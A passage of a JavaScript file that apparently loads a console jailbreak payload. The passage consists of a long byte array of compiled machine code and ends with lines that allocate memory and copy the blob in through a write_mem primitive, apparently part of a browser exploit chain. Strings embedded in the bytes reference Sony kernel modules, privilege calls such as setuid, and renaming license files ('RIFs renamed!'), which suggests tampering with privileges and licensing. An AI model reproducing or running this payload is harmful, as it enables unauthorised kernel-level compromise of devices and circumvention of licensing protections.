61,184,12,0,0,72,141,21,97,14,0,0,72,141,53,71,9,0,0,232,109,254,255,255,139,61,159,12,0,0,72,141,21,248,13,0,0,72,141,53,66,9,0,0,232,84,254,255,255,139,61,134,12,0,0,72,141,21,23,14,0,0,72,141,53,64,9,0,0,232,59,254,255,255,139,61,109,12,0,0,72,141,21,246,13,0,0,88,72,141,53,63,9,0,0,233,33,254,255,255,83,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,60,9,0,0,255,21,223,12,0,0,72,141,21,40,14,0,0,72,141,53,64,9,0,0,137,195,137,199,232,240,253,255,255,137,223,72,141,21,167,15,0,0,72,141,53,46,9,0,0,232,219,253,255,255,137,223,72,141,21,34,14,0,0,72,141,53,30,9,0,0,232,198,253,255,255,137,223,72,141,21,125,14,0,0,72,141,53,16,9,0,0,232,177,253,255,255,137,223,72,141,21,8,15,0,0,72,141,53,3,9,0,0,232,156,253,255,255,137,223,72,141,21,179,14,0,0,72,141,53,247,8,0,0,232,135,253,255,255,137,223,72,141,21,142,13,0,0,72,141,53,233,8,0,0,232,114,253,255,255,137,223,72,141,21,57,14,0,0,72,141,53,219,8,0,0,232,93,253,255,255,137,223,72,141,21,68,13,0,0,72,141,53,205,8,0,0,232,72,253,255,255,137,223,72,141,21,247,13,0,0,72,141,53,191,8,0,0,232,51,253,255,255,137,223,72,141,21,162,13,0,0,72,141,53,178,8,0,0,232,30,253,255,255,137,223,72,141,21,245,13,0,0,72,141,53,164,8,0,0,232,9,253,255,255,137,223,72,141,21,160,14,0,0,72,141,53,151,8,0,0,232,244,252,255,255,137,223,72,141,21,59,14,0,0,72,141,53,137,8,0,0,232,223,252,255,255,137,223,72,141,21,134,13,0,0,72,141,53,123,8,0,0,232,202,252,255,255,137,223,72,141,21,41,14,0,0,72,141,53,110,8,0,0,232,181,252,255,255,137,223,72,141,21,180,12,0,0,72,141,53,97,8,0,0,232,160,252,255,255,137,223,72,141,21,111,13,0,0,72,141,53,85,8,0,0,232,139,252,255,255,137,223,72,141,21,42,14,0,0,72,141,53,71,8,0,0,232,118,252,255,255,137,223,72,141,21,181,12,0,0,72,141,53,57,8,0,0,232,97,252,255,255,137,223,72,141,21,232,12,0,0,72,141,53,44,8,0,0,232,76,252,255,255,137,223,72,141,21,59,13,0,0,72,141,53,30,8,0,0,232,55,252,255,255,137,223,72,141,21,46,13,0,0,72,141,53,17,8,0,0,232,34,252,255,255,137,223,72,141,21,113,12,0,0,72,141,53,251,7,0,0,232,13,252,255,255,137,223,72,141,21,132,13,0,0,72,141,53,237,7,0,0,232,248,251,255,255,137,223,72,141,21,127,13,0,0,72,141,53,224,7,0,0,232,227,251,255,255,137,223,72,141,21,130,12,0,0,72,141,53,208,7,0,0,232,206,251,255,255,137,223,72,141,21,197,11,0,0,72,141,53,195,7,0,0,232,185,251,255,255,137,223,72,141,21,16,12,0,0,72,141,53,183,7,0,0,232,164,251,255,255,137,223,72,141,21,139,12,0,0,72,141,53,173,7,0,0,232,143,251,255,255,137,223,72,141,21,78,12,0,0,72,141,53,159,7,0,0,232,122,251,255,255,137,223,72,141,21,161,12,0,0,72,141,53,144,7,0,0,232,101,251,255,255,137,223,72,141,21,244,11,0,0,72,141,53,124,7,0,0,232,80,251,255,255,137,223,72,141,21,63,11,0,0,72,141,53,108,7,0,0,232,59,251,255,255,137,223,72,141,21,66,12,0,0,72,141,53,95,7,0,0,232,38,251,255,255,137,223,72,141,21,141,11,0,0,72,141,53,68,7,0,0,232,17,251,255,255,137,223,72,141,21,120,12,0,0,72,141,53,55,7,0,0,232,252,250,255,255,137,223,72,141,21,51,12,0,0,72,141,53,27,7,0,0,232,231,250,255,255,137,223,72,141,21,118,12,0,0,72,141,53,21,7,0,0,232,210,250,255,255,137,223,72,141,21,33,12,0,0,72,141,53,7,7,0,0,232,189,250,255,255,137,223,72,141,21,204,11,0,0,72,141,53,251,6,0,0,232,168,250,255,255,137,223,72,141,21,23,12,0,0,72,141,53,240,6,0,0,232,147,250,255,255,137,223,72,141,21,18,11,0,0,72,141,53,231,6,0,0,232,126,250,255,255,137,223,72,141,21,189,11,0,0,72,141,53,217,6,0,0,232,105,250,255,255,137,223,72,141,21,160,10,0,0,72,141,53,204,6,0,0,232,84,250,255,255,137,223,72,141,21,123,10,0,0,72,141,53,191,6,0,0,232,63,250,255,255,137,223,72,141,21,238,11,0,0,72,141,53,180,6,0,0,232,42,250,255,255,137,223,72,141,21,57,10,0,0,72,141,53,167,6,0,0,232,21,250,255,255,137,223,72,141,21,44,10,0,0,72,141,53,154,6,0,0,232,0,250,255,255,137,223,72,141,21,167,11,0,0,72,141,53,143,6,0,0,232,235,249,255,255,137,223,72,141,21,130,10,0,0,72,141,53,131,6,0,0,232,214,249,255,255,137,223,72,141,21,5,10,0,0,72,141,53,116,6,0,0,232,193,249,255,255,137,223,72,141,21,192,10,0,0,72,141,53,107,6,0,0,232,172,249,255,255,137,223,72,141,21,139,10,0,0,72,141,53,92,6,0,0,232,151,249,255,255,137,223,72,141,21,22,11,0,0,72,141,53,77,6,0,0,232,130,249,255,255,137,223,72,141,21,249,9,0,0,72,141,53,63,6,0,0,232,109,249,255,255,137,223,72,141,21,140,10,0,0,72,141,53,48,6,0,0,232,88,249,255,255,137,223,72,141,21,135,10,0,0,72,141,53,33,6,0,0,232,67,249,255,255,137,223,91,72,141,21,161,9,0,0,72,141,53,18,6,0,0,233,45,249,255,255,72,49,192,73,137,202,15,5,114,1,195,72,131,61,210,7,0,0,0,116,24,80,255,21,201,7,0,0,89,137,8,72,199,192,255,255,255,255,72,199,194,255,255,255,255,195,37,115,47,37,115,0,102,97,107,101,0,47,115,121,115,116,101,109,95,100,97,116,97,47,112,114,105,118,47,108,105,99,101,110,115,101,0,47,117,115,101,114,47,108,105,99,101,110,115,101,0,82,73,70,115,32,114,101,110,97,109,101,100,33,0,108,105,98,107,101,114,110,101,108,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,119,101,98,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,115,121,115,46,115,112,114,120,0,95,95,115,116,97,99,107,95,99,104,107,95,103,117,97,114,100,0,95,95,115,116,97,99,107,95,99,104,107,95,102,97,105,108,0,95,95,101,114,114,111,114,0,115,99,101,75,101,114,110,101,108,69,114,114,111,114,0,115,99,101,75,101,114,110,101,108,76,111,97,100,83,116,97,114,116,77,111,100,117,108,101,0,115,99,101,75,101,114,110,101,108,65,108,108,111,99,97,116,101,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,77,97,112,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,71,101,116,68,105,114,101,99,116,77,101,109,111,114,121,83,105,122,101,0,115,99,101,75,101,114,110,101,108,83,116,97,116,0,115,99,101,75,101,114,110,101,108,79,112,101,110,0,115,99,101,75,101,114,110,101,108,82,101,97,100,0,115,99,101,75,101,114,110,101,108,76,115,101,101,107,0,115,99,101,75,101,114,110,101,108,67,108,111,115,101,0,115,99,101,75,101,114,110,101,108,83,108,101,101,112,0,115,99,101,75,101,114,110,101,108,85,115,108,101,101,112,0,115,99,101,75,101,114,110,101,108,71,101,116,116,105,109,101,111,102,100,97,121,0,115,99,101,75,101,114,110,101,108,71,101,116,80,114,111,99,101,115,115,84,105,109,101,0,115,99,101,75,101,114,110,101,108,71,101,116,67,117,114,114,101,110,116,67,112,117,0,115,121,115,99,116,108,0,115,121,115,99,116,108,98,121,110,97,109,101,0,115,121,115,97,114,99,104,0,101,120,101,99,118,101,0,112,116,104,114,101,97,100,95,115,101,108,102,0,112,116,104,114,101,97,100,95,115,101,116,97,102,102,105,110,105,116,121,95,110,112,0,115,99,101,75,101,114,110,101,108,67,114,101,97,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,68,101,108,101,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,65,100,100,85,115,101,114,69,118,101,110,116,0,115,99,101,75,101,114,110,101,108,65,100,100,82,101,97,100,69,118,101,110,116,0,103,101,116,117,105,100,0,103,101,116,103,105,100,0,103,101,116,112,105,100,0,115,101,116,117,105,100,0,115,101,116,103,105,100,0,115,101,116,114,101,117,105,100,0,115,101,116,114,101,103,105,100,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,85,116,105,108,46,115,112,114,120,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,83,121,115,85,116,105,108,83,101,110,100,83,121,115,116,101,109,78,111,116,105,102,105,99,97,116,105,111,110,87,105,116,104,84,101,120,116,0,115,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,76,97,117,110,99,104,87,101,98,66,114,111,119,115,101,114,0,115,99,101,80,116,104,114,101,97,100,67,114,101,97,116,101,0,115,99,101,80,116,104,114,101,97,100,69,120,105,116,0,115,99,101,80,116,104,114,101,97,100,68,101,116,97,99,104,0,115,99,101,80,116,104,114,101,97,100,74,111,105,110,0,115,99,101,80,116,104,114,101,97,100,89,105,101,108,100,0,115,99,101,80,116,104,114,101,97,100,83,101,108,102,0,115,99,101,80,116,104,114,101,97,100,67,97,110,99,101,108,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,73,110,105,116,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,68,101,115,116,114,111,121,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,76,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,84,114,121,108,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,84,105,109,101,100,108,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,85,110,108,111,99,107,0,108,105,98,83,99,101,76,105,98,99,73,110,116,101,114,110,97,108,46,115,112,114,120,0,109,97,108,108,111,99,0,102,114,101,101,0,99,97,108,108,111,99,0,114,101,97,108,108,111,99,0,109,101,109,97,108,105,103,110,0,109,101,109,115,101,116,0,109,101,109,99,112,121,0,109,101,109,99,109,112,0,115,116,114,99,112,121,0,115,116,114,110,99,112,121,0,115,116,114,99,97,116,0,115,116,114,110,99,97,116,0,115,116,114,108,101,110,0,115,116,114,99,109,112,0,115,116,114,110,99,109,112,0,115,112,114,105,110,116,102,0,115,110,112,114,105,110,116,102,0,115,115,99,97,110,102,0,115,116,114,99,104,114,0,115,116,114,114,99,104,114,0,115,116,114,115,116,114,0,115,116,114,100,117,112,0,114,105,110,100,101,120,0,105,115,100,105,103,105,116,0,97,116,111,105,0,115,116,114,108,99,112,121,0,115,116,114,101,114,114,111,114,0,95,71,101,116,112,99,116,121,112,101,0,95,83,116,111,117,108,0,98,99,111,112,121,0,115,114,97,110,100,0,97,115,99,116,105,109,101,0,97,115,99,116,105,109,101,95,114,0,103,109,116,105,109,101,0,103,109,116,105,109,101,95,115,0,108,111,99,97,108,116,105,109,101,0,108,111,99,97,108,116,105,109,101,95,114,0,109,107,116,105,109,101,0,111,112,101,110,100,105,114,0,114,101,97,100,100,105,114,0,114,101,97,100,100,105,114,95,114,0,116,101,108,108,100,105,114,0,115,101,101,107,100,105,114,0,114,101,119,105,110,100,100,105,114,0,99,108,111,115,101,100,105,114,0,100,105,114,102,100,0,103,101,116,112,114,111,103,110,97,109,101,0,102,111,112,101,110,0,102,114,101,97,100,0,102,119,114,105,116,101,0,102,115,101,101,107,0,102,116,101,108,108,0,102,99,108,111,115,101,0,102,112,114,105,110,116,102,0,47,108,105,98,54,52,47,108,100,45,108,105,110,117,120,45,120,56,54,45,54,52,46,115,111,46,50,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,245,254,255,111,0,0,0,0,96,25,32,38,9,0,0,0,5,0,0,0,0,0,0,0,88,25,32,38,9,0,0,0,6,0,0,0,0,0,0,0,64,25,32,38,9,0,0,0,10,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,11,0,0,0,0,0,0,0,24,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,251,255,255,111,0,0,0,0,1,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];

window.mira_blob_2_len = 0x1a60;
window.mira_blob_2 = malloc(window.mira_blob_2_len);
write_mem(window.mira_blob_2, payload);